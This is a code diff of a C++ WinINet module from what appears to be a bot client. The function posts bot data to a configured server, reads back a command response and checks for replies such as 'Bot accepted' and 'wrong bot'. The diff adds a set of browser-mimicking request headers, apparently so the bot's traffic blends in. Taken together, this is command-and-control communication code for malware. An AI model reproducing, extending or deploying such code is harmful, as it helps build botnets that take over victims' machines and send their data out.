@@ -76,8 +76,13 @@ DWORD Http::_getCommand(CORE_DATA* pCoreData){
 	return 0;
 }
 DWORD Http::_postDataToServer(CORE_DATA* pCoreData, BYTE *postData, DWORD dataSize){
-	/**/
-	
+	/*
+	printf("postData of bot\r\n");
+	for (int i = 0; i < dataSize; i++){
+		printf("0x%02x,",postData[i]);
+	}
+	*/
+	printf("\r\n");
 	HINTERNET hInternet = InternetOpenW(HTTP_VERSION, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 	if (hInternet == NULL){
 		//printf("InternetOpenW failed with error code: %d\r\n",GetLastError());
@@ -92,12 +97,30 @@ DWORD Http::_postDataToServer(CORE_DATA* pCoreData, BYTE *postData, DWORD dataSi
 		}
 		else{
 			
-			HINTERNET hRequest = HttpOpenRequestA(hConnect, HTTP_POST, pCoreData->coreConfig.server.HELLO_PATH, HTTP_VERSIONA, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+			HINTERNET hRequest = HttpOpenRequestA(hConnect, HTTP_POST, pCoreData->coreConfig.server.HELLO_PATH, HTTP_VERSIONA, 
+				NULL, NULL, INTERNET_FLAG_RELOAD, 0);
 			if (hRequest == NULL){
 				printf("HttpOpenRequestW failed with error code: %d\r\n",GetLastError());
 			}
 			else
 			{
+				BOOL result;
+				result = HttpAddRequestHeadersA(hRequest, HTTP_USER_AGENT, strlen(HTTP_USER_AGENT), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n",GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_ACCEPT, strlen(HTTP_ACCEPT), HTTP_ADDREQ_FLAG_ADD_IF_NEW);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n", GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_ACCEPT_LANGUAGE, strlen(HTTP_ACCEPT_LANGUAGE), HTTP_ADDREQ_FLAG_COALESCE);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n", GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_ACCEP_ENCODING, strlen(HTTP_ACCEP_ENCODING), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n", GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_DNT, strlen(HTTP_DNT), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n", GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_CONNECTION, strlen(HTTP_CONNECTION), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n", GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_CONTENT_TYPE, strlen(HTTP_CONTENT_TYPE), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA error: %d\r\n", GetLastError()); }
+				result = HttpAddRequestHeadersA(hRequest, HTTP_CACHE_CONTROL, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_REPLACE);
+				//if (result == FALSE){ printf("HttpAddRequestHeadersA HTTP_CACHE_CONTROL error: %d\r\n", GetLastError()); }
 				BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, postData, dataSize);
 				//printf("Command\r\n");
 				string command = "";
@@ -113,8 +136,8 @@ DWORD Http::_postDataToServer(CORE_DATA* pCoreData, BYTE *postData, DWORD dataSi
 					command.append(buff, dwBytesRead);
 				}
 				printf("Command Response: |%s|\r\n", command.c_str());
-				if (strcmp(command.c_str(), "Bot accepted") == 0){
-					printf("BOT OK");
+				if (strcmp(command.c_str(), "wrong bot") == 0){
+					printf("BOT NOT OK");
 				}
 				InternetCloseHandle(hRequest);
 			}
